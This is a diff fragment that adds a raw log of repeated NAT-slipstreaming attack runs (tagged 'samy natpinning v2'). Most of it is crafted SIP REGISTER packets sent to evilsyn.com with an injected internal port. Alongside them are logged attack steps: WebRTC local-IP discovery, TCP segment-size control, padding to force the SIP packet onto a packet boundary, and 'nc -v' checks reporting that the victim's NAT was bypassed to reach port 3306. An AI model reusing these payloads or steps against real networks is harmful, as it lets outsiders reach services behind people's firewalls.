+   Allow: REGISTER, INVITE, ACK, CANCEL, BYE, NOTIFY, REFER, MESSAGE, OPTIONS, INFO, SUBSCRIBE
+   Supported: replaces, norefersub, extended-refer, timer, X-cisco-serviceuri
+   User-Agent: samy natpinning v2
+   Allow-Events: presence, kpml
+   Content-Length: 0
+   -----------------------------67898922520707899931664050299--
+   </i><br>packet size changed on us, reattempt SIP REGISTER<br>offset=17 (orig 17), received this packet:
+<i>   ^_^_^_^_^_^_^_=
+   REGISTER sip:evilsyn.com;transport=TCP SIP/2.0
+   Via: SIP/2.0/TCP 1.3.3.13:5060;branch=I9hG4bK-d8754z-c2ac7de1b3ce90f7-1---d8754z-;rport;transport=TCP
+   Max-Forwards: 70
+   Contact:<b> <sip:samy@1.3.3.13:11111;rinstance=v40f3f83b335139c;transport=TCP>
+   </b>To: <sip:samy@evilsyn.com;transport=TCP>
+   From: <sip:samy@evilsyn.com;transport=TCP>;tag=U7c3d519
+   Call-ID: aaaaaaaaaaaaa06505885696903827bbbbbbZjQ4M2M.
+   CSeq: 1 REGISTER
+   Expires: 70
+   Allow: REGISTER, INVITE, ACK, CANCEL, BYE, NOTIFY, REFER, MESSAGE, OPTIONS, INFO, SUBSCRIBE
+   Supported: replaces, norefersub, extended-refer, timer, X-cisco-serviceuri
+   User-Agent: samy natpinning v2
+   Allow-Events: presence, kpml
+   Content-Length: 0
+   -----------------------------13703907589287692055464920--
+   </i><br>injecting overflowed 2nd packet contents:
+<i>   REGISTER sip:evilsyn.com;transport=TCP SIP/2.0   
+   Via: SIP/2.0/TCP <b><b>1.3.3.13</b></b>:5060;branch=I9hG4bK-d8754z-c2ac7de1b3ce90f7-1---d8754z-;rport;transport=TCP   
+   Max-Forwards: 70   
+   Contact:<b> <sip:samy@1.3.3.13:<b>11111</b>;rinstance=v40f3f83b335139c;transport=TCP>   
+   </b>To: <sip:samy@evilsyn.com;transport=TCP>   
+   From: <sip:samy@evilsyn.com;transport=TCP>;tag=U7c3d519   
+   Call-ID: aaaaaaaaaaaaa06505885696903827bbbbbbZjQ4M2M.   
+   CSeq: 1 REGISTER   
+   Expires: 70   
+   Allow: REGISTER, INVITE, ACK, CANCEL, BYE, NOTIFY, REFER, MESSAGE, OPTIONS, INFO, SUBSCRIBE   
+   Supported: replaces, norefersub, extended-refer, timer, X-cisco-serviceuri   
+   User-Agent: samy natpinning v2   
+   Allow-Events: presence, kpml   
+   Content-Length: 0   
+      
+   </i><br>maximizing POST data over port 5060 to force "SIP packet" to begin on packet boundary<br>
+ready to traverse NAT/network/firewall, <b>press button above</b>...<br>stuff padding to fill tcp packet: <b>827 bytes</b><br>beacon received, packet capture lengths: {id:06505885696903827, stuff_bytes:827}<br>using first ip: <b>1.3.3.13</b><br>redirected to http to continue attack with localips in url<br>webrtc acquired ips: <b>1.3.3.13</b><br>created webrtc data channel to obtain local ip over https<br>sending TCP beacon to detect maximum packet size and MTU<br>responding to SYN with maximum segment size TCP option to control data size<br>requesting sniffed packet sizes from server<br>
+)
+
+192.168.1.197 1640255165: Array
+(
+    [C2] => {id:0412367836959883, stuff_bytes:831}
+)
+
+192.168.1.197 1640255266: Array
+(
+    [C6] => {id:033265173316647567, stuff_bytes:829}
+)
+
+192.168.1.197 1640255338: Array
+(
+    [C8] => {id:06402819251901717, stuff_bytes:829}
+)
+
+192.168.1.197 1640255380: Array
+(
+    [C5] => {id:03201880916266877, stuff_bytes:833}
+)
+
+192.168.1.197 1640255467: Array
+(
+    [C9] => {id:06404216256058639, stuff_bytes:831}
+)
+
+192.168.1.197 1640255484: Array
+(
+    [C2] => 192.168.1.197:3306: It's working
+<br><b>connected to 192.168.1.197:3306</b><br>
+<b>attempting to bypass your NAT/firewall</b><br>running: nc -v 192.168.1.197 3306<br><br><b>status: SUCCESS! ip in returned SIP packet is 192.168.1.197</b>, different than what we sent (<b>1.3.3.13</b>), victim NAT rewrote it<br><hr><br>offset=0 (orig 0), received this packet:
+<i>   REGISTER sip:evilsyn.com;transport=TCP SIP/2.0
+   Via: SIP/2.0/TCP 1.3.3.13:5060;branch=I9hG4bK-d8754z-c2ac7de1b3ce90f7-1---d8754z-;rport;transport=TCP
+   Max-Forwards: 70
+   Contact:<b> <sip:samy@192.168.1.197:3306;rinstance=v40f3f83b335139c;transport=TCP>
+   </b>To: <sip:samy@evilsyn.com;transport=TCP>
+   From: <sip:samy@evilsyn.com;transport=TCP>;tag=U7c3d519
+   Call-ID: aaaaaaaaaaaaa06404216256058639bbbbbbZjQ4M2M.
+   CSeq: 1 REGISTER
+   Expires: 70
+   Allow: REGISTER, INVITE, ACK, CANCEL, BYE, NOTIFY, REFER, MESSAGE, OPTIONS, INFO, SUBSCRIBE
+   Supported: replaces, norefersub, extended-refer, timer, X-cisco-serviceuri
+   User-Agent: samy natpinning v2
+   Allow-Events: presence, kpml
+   Content-Length: 0
+   -----------------------------9840549201536124566679457828--
+   </i><br>packet size changed on us, reattempt SIP REGISTER<br>offset=4 (orig 4), received this packet:
+<i>   _=
+   REGISTER sip:evilsyn.com;transport=TCP SIP/2.0
+   Via: SIP/2.0/TCP 1.3.3.13:5060;branch=I9hG4bK-d8754z-c2ac7de1b3ce90f7-1---d8754z-;rport;transport=TCP
+   Max-Forwards: 70
+   Contact:<b> <sip:samy@1.3.3.13:3306;rinstance=v40f3f83b335139c;transport=TCP>
+   </b>To: <sip:samy@evilsyn.com;transport=TCP>
+   From: <sip:samy@evilsyn.com;transport=TCP>;tag=U7c3d519
+   Call-ID: aaaaaaaaaaaaa06404216256058639bbbbbbZjQ4M2M.
+   CSeq: 1 REGISTER
+   Expires: 70
+   Allow: REGISTER, INVITE, ACK, CANCEL, BYE, NOTIFY, REFER, MESSAGE, OPTIONS, INFO, SUBSCRIBE
+   Supported: replaces, norefersub, extended-refer, timer, X-cisco-serviceuri
+   User-Agent: samy natpinning v2
+   Allow-Events: presence, kpml
+   Content-Length: 0
+   -----------------------------168998296115893150531547792247--
+   </i><br>packet size changed on us, reattempt SIP REGISTER<br>new len 1488<br>old len 1513<br>offset same as last time, maybe something in HTTP header changed - adjusting packet length<br>offset=25 (orig 25), received this packet:
+<i>   ^_^_^_^_^_^_^_^_^_^_^_=
+   REGISTER sip:evilsyn.com;transport=TCP SIP/2.0
+   Via: SIP/2.0/TCP 1.3.3.13:5060;branch=I9hG4bK-d8754z-c2ac7de1b3ce90f7-1---d8754z-;rport;transport=TCP
+   Max-Forwards: 70
+   Contact:<b> <sip:samy@1.3.3.13:3306;rinstance=v40f3f83b335139c;transport=TCP>
+   </b>To: <sip:samy@evilsyn.com;transport=TCP>
+   From: <sip:samy@evilsyn.com;transport=TCP>;tag=U7c3d519
+   Call-ID: aaaaaaaaaaaaa06404216256058639bbbbbbZjQ4M2M.
+   CSeq: 1 REGISTER
+   Expires: 70
+   Allow: REGISTER, INVITE, ACK, CANCEL, BYE, NOTIFY, REFER, MESSAGE, OPTIONS, INFO, SUBSCRIBE
+   Supported: replaces, norefersub, extended-refer, timer, X-cisco-serviceuri
+   User-Agent: samy natpinning v2
+   Allow-Events: presence, kpml
+   Content-Length: 0
+   -----------------------------1383963047812647801078954684--
+   </i><br>packet size changed on us, reattempt SIP REGISTER<br>offset=25 (orig 25), received this packet:
+<i>   ^_^_^_^_^_^_^_^_^_^_^_=
+   REGISTER sip:evilsyn.com;transport=TCP SIP/2.0
+   Via: SIP/2.0/TCP 1.3.3.13:5060;branch=I9hG4bK-d8754z-c2ac7de1b3ce90f7-1---d8754z-;rport;transport=TCP
+   Max-Forwards: 70
+   Contact:<b> <sip:samy@1.3.3.13:3306;rinstance=v40f3f83b335139c;transport=TCP>
+   </b>To: <sip:samy@evilsyn.com;transport=TCP>
+   From: <sip:samy@evilsyn.com;transport=TCP>;tag=U7c3d519
+   Call-ID: aaaaaaaaaaaaa06404216256058639bbbbbbZjQ4M2M.
+   CSeq: 1 REGISTER
+   Expires: 70
+   Allow: REGISTER, INVITE, ACK, CANCEL, BYE, NOTIFY, REFER, MESSAGE, OPTIONS, INFO, SUBSCRIBE
+   Supported: replaces, norefersub, extended-refer, timer, X-cisco-serviceuri
+   User-Agent: samy natpinning v2
+   Allow-Events: presence, kpml
+   Content-Length: 0
+   -----------------------------2080544221014244911377668043--
+   </i><br>packet size changed on us, reattempt SIP REGISTER<br>offset=27 (orig 27), received this packet:
+<i>   ^_^_^_^_^_^_^_^_^_^_^_^_=
+   REGISTER sip:evilsyn.com;transport=TCP SIP/2.0
+   Via: SIP/2.0/TCP 1.3.3.13:5060;branch=I9hG4bK-d8754z-c2ac7de1b3ce90f7-1---d8754z-;rport;transport=TCP
+   Max-Forwards: 70
+   Contact:<b> <sip:samy@1.3.3.13:3306;rinstance=v40f3f83b335139c;transport=TCP>
+   </b>To: <sip:samy@evilsyn.com;transport=TCP>
+   From: <sip:samy@evilsyn.com;transport=TCP>;tag=U7c3d519
+   Call-ID: aaaaaaaaaaaaa06404216256058639bbbbbbZjQ4M2M.
+   CSeq: 1 REGISTER
+   Expires: 70
+   Allow: REGISTER, INVITE, ACK, CANCEL, BYE, NOTIFY, REFER, MESSAGE, OPTIONS, INFO, SUBSCRIBE
+   Supported: replaces, norefersub, extended-refer, timer, X-cisco-serviceuri
+   User-Agent: samy natpinning v2
+   Allow-Events: presence, kpml
+   Content-Length: 0
+   -----------------------------16739309825775855381829558425--
+   </i><br>packet size changed on us, reattempt SIP REGISTER<br>offset=23 (orig 23), received this packet:
+<i>   ^_^_^_^_^_^_^_^_^_^_=
+   REGISTER sip:evilsyn.com;transport=TCP SIP/2.0
+   Via: SIP/2.0/TCP 1.3.3.13:5060;branch=I9hG4bK-d8754z-c2ac7de1b3ce90f7-1---d8754z-;rport;transport=TCP
+   Max-Forwards: 70
+   Contact:<b> <sip:samy@1.3.3.13:3306;rinstance=v40f3f83b335139c;transport=TCP>
+   </b>To: <sip:samy@evilsyn.com;transport=TCP>
+   From: <sip:samy@evilsyn.com;transport=TCP>;tag=U7c3d519
+   Call-ID: aaaaaaaaaaaaa06404216256058639bbbbbbZjQ4M2M.
+   CSeq: 1 REGISTER
+   Expires: 70
+   Allow: REGISTER, INVITE, ACK, CANCEL, BYE, NOTIFY, REFER, MESSAGE, OPTIONS, INFO, SUBSCRIBE
+   Supported: replaces, norefersub, extended-refer, timer, X-cisco-serviceuri
+   User-Agent: samy natpinning v2
+   Allow-Events: presence, kpml
+   Content-Length: 0
+   -----------------------------627243023381987696955751370--
+   </i><br>packet size changed on us, reattempt SIP REGISTER<br>offset=25 (orig 25), received this packet:
+<i>   ^_^_^_^_^_^_^_^_^_^_^_=
+   REGISTER sip:evilsyn.com;transport=TCP SIP/2.0
+   Via: SIP/2.0/TCP 1.3.3.13:5060;branch=I9hG4bK-d8754z-c2ac7de1b3ce90f7-1---d8754z-;rport;transport=TCP
+   Max-Forwards: 70
+   Contact:<b> <sip:samy@1.3.3.13:3306;rinstance=v40f3f83b335139c;transport=TCP>
+   </b>To: <sip:samy@evilsyn.com;transport=TCP>
+   From: <sip:samy@evilsyn.com;transport=TCP>;tag=U7c3d519
+   Call-ID: aaaaaaaaaaaaa06404216256058639bbbbbbZjQ4M2M.
+   CSeq: 1 REGISTER
+   Expires: 70
+   Allow: REGISTER, INVITE, ACK, CANCEL, BYE, NOTIFY, REFER, MESSAGE, OPTIONS, INFO, SUBSCRIBE
+   Supported: replaces, norefersub, extended-refer, timer, X-cisco-serviceuri
+   User-Agent: samy natpinning v2
+   Allow-Events: presence, kpml
+   Content-Length: 0
+   -----------------------------6762353059980645191815543247--
+   </i><br>packet size changed on us, reattempt SIP REGISTER<br>offset=27 (orig 27), received this packet:
+<i>   ^_^_^_^_^_^_^_^_^_^_^_^_=
+   REGISTER sip:evilsyn.com;transport=TCP SIP/2.0
+   Via: SIP/2.0/TCP 1.3.3.13:5060;branch=I9hG4bK-d8754z-c2ac7de1b3ce90f7-1---d8754z-;rport;transport=TCP
+   Max-Forwards: 70
+   Contact:<b> <sip:samy@1.3.3.13:3306;rinstance=v40f3f83b335139c;transport=TCP>
+   </b>To: <sip:samy@evilsyn.com;transport=TCP>
+   From: <sip:samy@evilsyn.com;transport=TCP>;tag=U7c3d519
+   Call-ID: aaaaaaaaaaaaa06404216256058639bbbbbbZjQ4M2M.
+   CSeq: 1 REGISTER
+   Expires: 70
+   Allow: REGISTER, INVITE, ACK, CANCEL, BYE, NOTIFY, REFER, MESSAGE, OPTIONS, INFO, SUBSCRIBE
+   Supported: replaces, norefersub, extended-refer, timer, X-cisco-serviceuri
+   User-Agent: samy natpinning v2
+   Allow-Events: presence, kpml
+   Content-Length: 0
+   -----------------------------23172166421368086921495787680--
+   </i><br>injecting overflowed 2nd packet contents:
+<i>   REGISTER sip:evilsyn.com;transport=TCP SIP/2.0   
+   Via: SIP/2.0/TCP <b><b>1.3.3.13</b></b>:5060;branch=I9hG4bK-d8754z-c2ac7de1b3ce90f7-1---d8754z-;rport;transport=TCP   
+   Max-Forwards: 70   
+   Contact:<b> <sip:samy@1.3.3.13:<b>3306</b>;rinstance=v40f3f83b335139c;transport=TCP>   
+   </b>To: <sip:samy@evilsyn.com;transport=TCP>   
+   From: <sip:samy@evilsyn.com;transport=TCP>;tag=U7c3d519   
+   Call-ID: aaaaaaaaaaaaa06404216256058639bbbbbbZjQ4M2M.   
+   CSeq: 1 REGISTER   
+   Expires: 70   
+   Allow: REGISTER, INVITE, ACK, CANCEL, BYE, NOTIFY, REFER, MESSAGE, OPTIONS, INFO, SUBSCRIBE   
+   Supported: replaces, norefersub, extended-refer, timer, X-cisco-serviceuri   
+   User-Agent: samy natpinning v2   
+   Allow-Events: presence, kpml   
+   Content-Length: 0   
+      
+   </i><br>maximizing POST data over port 5060 to force "SIP packet" to begin on packet boundary<br>
+ready to traverse NAT/network/firewall, <b>press button above</b>...<br>stuff padding to fill tcp packet: <b>831 bytes</b><br>beacon received, packet capture lengths: {id:06404216256058639, stuff_bytes:831}<br>using first ip: <b>1.3.3.13</b><br>redirected to http to continue attack with localips in url<br>webrtc acquired ips: <b>1.3.3.13</b><br>created webrtc data channel to obtain local ip over https<br>sending TCP beacon to detect maximum packet size and MTU<br>responding to SYN with maximum segment size TCP option to control data size<br>requesting sniffed packet sizes from server<br>
+)
+
+192.168.1.197 1640255499: Array
+(
+    [C1] => {id:09485257076824956, stuff_bytes:833}
+)
+
+192.168.1.197 1640255611: Array
+(
+    [C1] => {id:043180295115427236, stuff_bytes:833}
+)
+
+192.168.1.197 1640255708: Array
+(
+    [C1] => 192.168.1.197:3306: It's working
+<br><b>connected to 192.168.1.197:3306</b><br>
+<b>attempting to bypass your NAT/firewall</b><br>running: nc -v 192.168.1.197 3306<br><br><b>status: SUCCESS! ip in returned SIP packet is 192.168.1.197</b>, different than what we sent (<b>1.3.3.13</b>), victim NAT rewrote it<br><hr><br>offset=0 (orig 0), received this packet:
+<i>   REGISTER sip:evilsyn.com;transport=TCP SIP/2.0
+   Via: SIP/2.0/TCP 1.3.3.13:5060;branch=I9hG4bK-d8754z-c2ac7de1b3ce90f7-1---d8754z-;rport;transport=TCP
+   Max-Forwards: 70
+   Contact:<b> <sip:samy@192.168.1.197:3306;rinstance=v40f3f83b335139c;transport=TCP>
+   </b>To: <sip:samy@evilsyn.com;transport=TCP>
+   From: <sip:samy@evilsyn.com;transport=TCP>;tag=U7c3d519
+   Call-ID: aaaaaaaaaaaa043180295115427236bbbbbbZjQ4M2M.
+   CSeq: 1 REGISTER
+   Expires: 70
+   Allow: REGISTER, INVITE, ACK, CANCEL, BYE, NOTIFY, REFER, MESSAGE, OPTIONS, INFO, SUBSCRIBE
+   Supported: replaces, norefersub, extended-refer, timer, X-cisco-serviceuri
+   User-Agent: samy natpinning v2
+   Allow-Events: presence, kpml
+   Content-Length: 0
+   -----------------------------12587455628358738381495201865--
+   </i><br>packet size changed on us, reattempt SIP REGISTER<br>new len 1486<br>old len 1515<br>offset same as last time, maybe something in HTTP header changed - adjusting packet length<br>offset=29 (orig 29), received this packet:
+<i>   ^_^_^_^_^_^_^_^_^_^_^_^_^_=
+   REGISTER sip:evilsyn.com;transport=TCP SIP/2.0
+   Via: SIP/2.0/TCP 1.3.3.13:5060;branch=I9hG4bK-d8754z-c2ac7de1b3ce90f7-1---d8754z-;rport;transport=TCP
+   Max-Forwards: 70
+   Contact:<b> <sip:samy@1.3.3.13:3306;rinstance=v40f3f83b335139c;transport=TCP>
+   </b>To: <sip:samy@evilsyn.com;transport=TCP>
+   From: <sip:samy@evilsyn.com;transport=TCP>;tag=U7c3d519
+   Call-ID: aaaaaaaaaaaa043180295115427236bbbbbbZjQ4M2M.
+   CSeq: 1 REGISTER
+   Expires: 70
+   Allow: REGISTER, INVITE, ACK, CANCEL, BYE, NOTIFY, REFER, MESSAGE, OPTIONS, INFO, SUBSCRIBE
+   Supported: replaces, norefersub, extended-refer, timer, X-cisco-serviceuri
+   User-Agent: samy natpinning v2
+   Allow-Events: presence, kpml
+   Content-Length: 0
+   -----------------------------19579841016576862372145367267--
+   </i><br>packet size changed on us, reattempt SIP REGISTER<br>offset=29 (orig 29), received this packet:
+<i>   ^_^_^_^_^_^_^_^_^_^_^_^_^_=
+   REGISTER sip:evilsyn.com;transport=TCP SIP/2.0
+   Via: SIP/2.0/TCP 1.3.3.13:5060;branch=I9hG4bK-d8754z-c2ac7de1b3ce90f7-1---d8754z-;rport;transport=TCP
+   Max-Forwards: 70
+   Contact:<b> <sip:samy@1.3.3.13:3306;rinstance=v40f3f83b335139c;transport=TCP>
+   </b>To: <sip:samy@evilsyn.com;transport=TCP>
+   From: <sip:samy@evilsyn.com;transport=TCP>;tag=U7c3d519
+   Call-ID: aaaaaaaaaaaa043180295115427236bbbbbbZjQ4M2M.
+   CSeq: 1 REGISTER
+   Expires: 70
+   Allow: REGISTER, INVITE, ACK, CANCEL, BYE, NOTIFY, REFER, MESSAGE, OPTIONS, INFO, SUBSCRIBE
+   Supported: replaces, norefersub, extended-refer, timer, X-cisco-serviceuri
+   User-Agent: samy natpinning v2
+   Allow-Events: presence, kpml
+   Content-Length: 0
+   -----------------------------95514951318302920101679180544--
+   </i><br>packet size changed on us, reattempt SIP REGISTER<br>offset=31 (orig 31), received this packet:
+<i>   ^_^_^_^_^_^_^_^_^_^_^_^_^_^_=
+   REGISTER sip:evilsyn.com;transport=TCP SIP/2.0
+   Via: SIP/2.0/TCP 1.3.3.13:5060;branch=I9hG4bK-d8754z-c2ac7de1b3ce90f7-1---d8754z-;rport;transport=TCP
+   Max-Forwards: 70
+   Contact:<b> <sip:samy@1.3.3.13:3306;rinstance=v40f3f83b335139c;transport=TCP>
+   </b>To: <sip:samy@evilsyn.com;transport=TCP>
+   From: <sip:samy@evilsyn.com;transport=TCP>;tag=U7c3d519
+   Call-ID: aaaaaaaaaaaa043180295115427236bbbbbbZjQ4M2M.
+   CSeq: 1 REGISTER
+   Expires: 70
+   Allow: REGISTER, INVITE, ACK, CANCEL, BYE, NOTIFY, REFER, MESSAGE, OPTIONS, INFO, SUBSCRIBE
+   Supported: replaces, norefersub, extended-refer, timer, X-cisco-serviceuri
+   User-Agent: samy natpinning v2
+   Allow-Events: presence, kpml
+   Content-Length: 0
+   -----------------------------100908452815267496791435209986--
+   </i><br>packet size changed on us, reattempt SIP REGISTER<br>offset=25 (orig 25), received this packet:
+<i>   ^_^_^_^_^_^_^_^_^_^_^_=
+   REGISTER sip:evilsyn.com;transport=TCP SIP/2.0
+   Via: SIP/2.0/TCP 1.3.3.13:5060;branch=I9hG4bK-d8754z-c2ac7de1b3ce90f7-1---d8754z-;rport;transport=TCP
+   Max-Forwards: 70
+   Contact:<b> <sip:samy@1.3.3.13:3306;rinstance=v40f3f83b335139c;transport=TCP>
+   </b>To: <sip:samy@evilsyn.com;transport=TCP>
+   From: <sip:samy@evilsyn.com;transport=TCP>;tag=U7c3d519
+   Call-ID: aaaaaaaaaaaa043180295115427236bbbbbbZjQ4M2M.
+   CSeq: 1 REGISTER
+   Expires: 70
+   Allow: REGISTER, INVITE, ACK, CANCEL, BYE, NOTIFY, REFER, MESSAGE, OPTIONS, INFO, SUBSCRIBE
+   Supported: replaces, norefersub, extended-refer, timer, X-cisco-serviceuri
+   User-Agent: samy natpinning v2
+   Allow-Events: presence, kpml
+   Content-Length: 0
+   -----------------------------530474092346750647429400671--
+   </i><br>packet size changed on us, reattempt SIP REGISTER<br>offset=31 (orig 31), received this packet:
+<i>   ^_^_^_^_^_^_^_^_^_^_^_^_^_^_=
+   REGISTER sip:evilsyn.com;transport=TCP SIP/2.0
+   Via: SIP/2.0/TCP 1.3.3.13:5060;branch=I9hG4bK-d8754z-c2ac7de1b3ce90f7-1---d8754z-;rport;transport=TCP
+   Max-Forwards: 70
+   Contact:<b> <sip:samy@1.3.3.13:3306;rinstance=v40f3f83b335139c;transport=TCP>
+   </b>To: <sip:samy@evilsyn.com;transport=TCP>
+   From: <sip:samy@evilsyn.com;transport=TCP>;tag=U7c3d519
+   Call-ID: aaaaaaaaaaaa043180295115427236bbbbbbZjQ4M2M.
+   CSeq: 1 REGISTER
+   Expires: 70
+   Allow: REGISTER, INVITE, ACK, CANCEL, BYE, NOTIFY, REFER, MESSAGE, OPTIONS, INFO, SUBSCRIBE
+   Supported: replaces, norefersub, extended-refer, timer, X-cisco-serviceuri
+   User-Agent: samy natpinning v2
+   Allow-Events: presence, kpml
+   Content-Length: 0
+   -----------------------------158553707415063075241266736936--
+   </i><br>packet size changed on us, reattempt SIP REGISTER<br>offset=29 (orig 29), received this packet:
+<i>   ^_^_^_^_^_^_^_^_^_^_^_^_^_=
+   REGISTER sip:evilsyn.com;transport=TCP SIP/2.0
+   Via: SIP/2.0/TCP 1.3.3.13:5060;branch=I9hG4bK-d8754z-c2ac7de1b3ce90f7-1---d8754z-;rport;transport=TCP
+   Max-Forwards: 70
+   Contact:<b> <sip:samy@1.3.3.13:3306;rinstance=v40f3f83b335139c;transport=TCP>
+   </b>To: <sip:samy@evilsyn.com;transport=TCP>
+   From: <sip:samy@evilsyn.com;transport=TCP>;tag=U7c3d519
+   Call-ID: aaaaaaaaaaaa043180295115427236bbbbbbZjQ4M2M.
+   CSeq: 1 REGISTER
+   Expires: 70
+   Allow: REGISTER, INVITE, ACK, CANCEL, BYE, NOTIFY, REFER, MESSAGE, OPTIONS, INFO, SUBSCRIBE
+   Supported: replaces, norefersub, extended-refer, timer, X-cisco-serviceuri
+   User-Agent: samy natpinning v2
+   Allow-Events: presence, kpml
+   Content-Length: 0
+   -----------------------------20728489811480268619415772084--
+   </i><br>injecting overflowed 2nd packet contents:
+<i>   REGISTER sip:evilsyn.com;transport=TCP SIP/2.0   
+   Via: SIP/2.0/TCP <b><b>1.3.3.13</b></b>:5060;branch=I9hG4bK-d8754z-c2ac7de1b3ce90f7-1---d8754z-;rport;transport=TCP   
+   Max-Forwards: 70   
+   Contact:<b> <sip:samy@1.3.3.13:<b>3306</b>;rinstance=v40f3f83b335139c;transport=TCP>   
+   </b>To: <sip:samy@evilsyn.com;transport=TCP>   
+   From: <sip:samy@evilsyn.com;transport=TCP>;tag=U7c3d519   
+   Call-ID: aaaaaaaaaaaa043180295115427236bbbbbbZjQ4M2M.   
+   CSeq: 1 REGISTER   
+   Expires: 70   
+   Allow: REGISTER, INVITE, ACK, CANCEL, BYE, NOTIFY, REFER, MESSAGE, OPTIONS, INFO, SUBSCRIBE   
+   Supported: replaces, norefersub, extended-refer, timer, X-cisco-serviceuri   
+   User-Agent: samy natpinning v2   
+   Allow-Events: presence, kpml   
+   Content-Length: 0   
+      
+   </i><br>maximizing POST data over port 5060 to force "SIP packet" to begin on packet boundary<br>
+ready to traverse NAT/network/firewall, <b>press button above</b>...<br>stuff padding to fill tcp packet: <b>833 bytes</b><br>beacon received, packet capture lengths: {id:043180295115427236, stuff_bytes:833}<br>using first ip: <b>1.3.3.13</b><br>redirected to http to continue attack with localips in url<br>webrtc acquired ips: <b>1.3.3.13</b><br>created webrtc data channel to obtain local ip over https<br>sending TCP beacon to detect maximum packet size and MTU<br>responding to SYN with maximum segment size TCP option to control data size<br>requesting sniffed packet sizes from server<br>
+)
+
+192.168.1.197 1640255760: Array
+(
+    [C2] => {id:09917195716271844, stuff_bytes:829}
+)
+
+192.168.1.197 1640255769: Array
+(
+    [C3] => {id:013697075255747793, stuff_bytes:829}
+)
+
+192.168.1.197 1640255814: Array
+(
+    [C0] => {id:006432056449893964, stuff_bytes:835}
+)
+
+192.168.1.197 1640255853: Array
+(
+    [C1] => 192.168.1.197:3306: It's Working - I bypassed the NAT firewall
+<br><b>connected to 192.168.1.197:3306</b><br>
+<b>attempting to bypass your NAT/firewall</b><br>running: nc -v 192.168.1.197 3306<br><br><b>status: SUCCESS! ip in returned SIP packet is 192.168.1.197</b>, different than what we sent (<b>1.3.3.13</b>), victim NAT rewrote it<br><hr><br>offset=0 (orig 0), received this packet:
+<i>   REGISTER sip:evilsyn.com;transport=TCP SIP/2.0
+   Via: SIP/2.0/TCP 1.3.3.13:5060;branch=I9hG4bK-d8754z-c2ac7de1b3ce90f7-1---d8754z-;rport;transport=TCP
+   Max-Forwards: 70
+   Contact:<b> <sip:samy@192.168.1.197:3306;rinstance=v40f3f83b335139c;transport=TCP>
+   </b>To: <sip:samy@evilsyn.com;transport=TCP>
+   From: <sip:samy@evilsyn.com;transport=TCP>;tag=U7c3d519
+   Call-ID: aaaaaaaaaaaa006432056449893964bbbbbbZjQ4M2M.
+   CSeq: 1 REGISTER
+   Expires: 70
+   Allow: REGISTER, INVITE, ACK, CANCEL, BYE, NOTIFY, REFER, MESSAGE, OPTIONS, INFO, SUBSCRIBE
+   Supported: replaces, norefersub, extended-refer, timer, X-cisco-serviceuri
+   User-Agent: samy natpinning v2
+   Allow-Events: presence, kpml
+   Content-Length: 0
+   -----------------------------67422635215818953932145836008--
+   </i><br>packet size changed on us, reattempt SIP REGISTER<br>new len 1486<br>old len 1488<br>offset same as last time, maybe something in HTTP header changed - adjusting packet length<br>offset=2 (orig 2), received this packet:
+<i>   
+   REGISTER sip:evilsyn.com;transport=TCP SIP/2.0
+   Via: SIP/2.0/TCP 1.3.3.13:5060;branch=I9hG4bK-d8754z-c2ac7de1b3ce90f7-1---d8754z-;rport;transport=TCP
+   Max-Forwards: 70
+   Contact:<b> <sip:samy@1.3.3.13:3306;rinstance=v40f3f83b335139c;transport=TCP>
+   </b>To: <sip:samy@evilsyn.com;transport=TCP>
+   From: <sip:samy@evilsyn.com;transport=TCP>;tag=U7c3d519
+   Call-ID: aaaaaaaaaaaa006432056449893964bbbbbbZjQ4M2M.
+   CSeq: 1 REGISTER
+   Expires: 70
+   Allow: REGISTER, INVITE, ACK, CANCEL, BYE, NOTIFY, REFER, MESSAGE, OPTIONS, INFO, SUBSCRIBE
+   Supported: replaces, norefersub, extended-refer, timer, X-cisco-serviceuri
+   User-Agent: samy natpinning v2
+   Allow-Events: presence, kpml
+   Content-Length: 0
+   -----------------------------68625996213699124521783574700--
+   </i><br>packet size changed on us, reattempt SIP REGISTER<br>offset=2 (orig 2), received this packet:
+<i>   
+   REGISTER sip:evilsyn.com;transport=TCP SIP/2.0
+   Via: SIP/2.0/TCP 1.3.3.13:5060;branch=I9hG4bK-d8754z-c2ac7de1b3ce90f7-1---d8754z-;rport;transport=TCP
+   Max-Forwards: 70
+   Contact:<b> <sip:samy@1.3.3.13:3306;rinstance=v40f3f83b335139c;transport=TCP>
+   </b>To: <sip:samy@evilsyn.com;transport=TCP>
+   From: <sip:samy@evilsyn.com;transport=TCP>;tag=U7c3d519
+   Call-ID: aaaaaaaaaaaa006432056449893964bbbbbbZjQ4M2M.
+   CSeq: 1 REGISTER
+   Expires: 70
+   Allow: REGISTER, INVITE, ACK, CANCEL, BYE, NOTIFY, REFER, MESSAGE, OPTIONS, INFO, SUBSCRIBE
+   Supported: replaces, norefersub, extended-refer, timer, X-cisco-serviceuri
+   User-Agent: samy natpinning v2
+   Allow-Events: presence, kpml
+   Content-Length: 0
+   -----------------------------34424289314824940751052206711--
+   </i><br>packet size changed on us, reattempt SIP REGISTER<br>new len 1488<br>old len 1517<br>offset same as last time, maybe something in HTTP header changed - adjusting packet length<br>offset=29 (orig 29), received this packet:
+<i>   ^_^_^_^_^_^_^_^_^_^_^_^_^_=
+   REGISTER sip:evilsyn.com;transport=TCP SIP/2.0
+   Via: SIP/2.0/TCP 1.3.3.13:5060;branch=I9hG4bK-d8754z-c2ac7de1b3ce90f7-1---d8754z-;rport;transport=TCP
+   Max-Forwards: 70
+   Contact:<b> <sip:samy@1.3.3.13:3306;rinstance=v40f3f83b335139c;transport=TCP>
+   </b>To: <sip:samy@evilsyn.com;transport=TCP>
+   From: <sip:samy@evilsyn.com;transport=TCP>;tag=U7c3d519
+   Call-ID: aaaaaaaaaaaa006432056449893964bbbbbbZjQ4M2M.
+   CSeq: 1 REGISTER
+   Expires: 70
+   Allow: REGISTER, INVITE, ACK, CANCEL, BYE, NOTIFY, REFER, MESSAGE, OPTIONS, INFO, SUBSCRIBE
+   Supported: replaces, norefersub, extended-refer, timer, X-cisco-serviceuri
+   User-Agent: samy natpinning v2
+   Allow-Events: presence, kpml
+   Content-Length: 0
+   -----------------------------1866290293893102790483836629--
+   </i><br>packet size changed on us, reattempt SIP REGISTER<br>offset=29 (orig 29), received this packet:
+<i>   ^_^_^_^_^_^_^_^_^_^_^_^_^_=
+   REGISTER sip:evilsyn.com;transport=TCP SIP/2.0
+   Via: SIP/2.0/TCP 1.3.3.13:5060;branch=I9hG4bK-d8754z-c2ac7de1b3ce90f7-1---d8754z-;rport;transport=TCP
+   Max-Forwards: 70
+   Contact:<b> <sip:samy@1.3.3.13:3306;rinstance=v40f3f83b335139c;transport=TCP>
